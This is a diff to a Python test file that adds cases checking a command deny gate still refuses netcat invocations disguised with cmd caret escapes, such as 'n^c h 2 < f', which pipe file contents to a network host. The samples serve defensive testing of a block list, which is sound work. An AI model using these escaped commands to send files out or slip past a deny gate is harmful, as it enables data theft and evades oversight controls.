@@ -89,6 +89,16 @@ _UNREAD = [
     "nc -z h 22; sort < " + "a" * 2000,
 ]
 
+# A cmd in-word escape (`^` between two letters) hides the nc word from the raw
+# text; the deny gate's folded view still finds it, as on main, so the reader must
+# not judge such a line from the unfolded text.
+_CMD_ESCAPED = [
+    "n^c h 1 < f",
+    "nc -z h 22; n^c h 2 < f",
+    "nc -z h 22; sort < f | n^c h 2",
+    "nc -z h 22; ca^t < f | n^c h 2",
+]
+
 
 def _hook_reason(command: str) -> str | None:
     from kiro_crew.hooks import TOOL_DENY, HookManager, HooksConfig
@@ -129,6 +139,12 @@ class TestEveryRealRedirectIsStillRefused:
     def test_the_row_alone_refuses(self, cmd: str) -> None:
         shipped = compute_effective_denied([_ROW], (), False, (), ())
         assert is_denied(cmd, denied_regexes=shipped) is not None, cmd
+
+    @pytest.mark.parametrize("cmd", _CMD_ESCAPED)
+    def test_a_cmd_escaped_nc_is_still_refused(self, cmd: str) -> None:
+        shipped = compute_effective_denied([_ROW], (), False, (), ())
+        assert is_denied(cmd, denied_regexes=shipped) is not None, cmd
+        assert is_denied(cmd) is not None, cmd
 
 
 class TestTheNarrowingIsAudited:
